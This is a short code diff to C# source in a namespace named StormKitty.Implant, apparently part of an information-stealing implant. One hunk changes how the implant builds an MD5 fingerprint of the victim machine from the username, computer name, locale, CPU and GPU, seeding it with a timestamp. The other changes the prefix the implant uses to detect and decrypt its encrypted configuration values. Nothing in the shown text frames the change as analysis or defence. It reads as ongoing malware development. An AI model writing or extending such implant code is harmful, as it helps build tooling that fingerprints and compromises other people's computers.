@@ -17,12 +17,12 @@ namespace StormKitty.Implant
         // Create hash from username, pcname, cpu, gpu
         public static string GenerateRandomData(string sd = "0")
         {
-            string number;
+            string number = sd;
             if (sd == "0")
-                number = new Random().Next(10, 20).ToString();
-            else
-                number = sd;
-
+            {
+                DateTime d = DateTime.Parse(SystemInfo.datenow);
+                number = ((long)((DateTimeOffset)d).Ticks).ToString();
+            }
             string data = $"{number}-{SystemInfo.username}-{SystemInfo.compname}-{SystemInfo.culture}-{SystemInfo.GetCPUName()}-{SystemInfo.GetGPUName()}";
             using (MD5 hash = MD5.Create())
             {
@@ -103,17 +103,17 @@ namespace StormKitty.Implant
             return Encoding.UTF8.GetString(decryptedBytes);
         }
 
-        // Decrypt config value
+        // Decrypt config values
         public static string DecryptConfig(string value)
         {
             if (string.IsNullOrEmpty(value))
                 return "";
 
-            if (!value.StartsWith("ENCRYPTED:"))
+            if (!value.StartsWith("CRYPTED:"))
                 return value;
 
             return Decrypt(Convert.FromBase64String(value
-                .Replace("ENCRYPTED:", "")));
+                .Replace("CRYPTED:", "")));
         }
 
     }
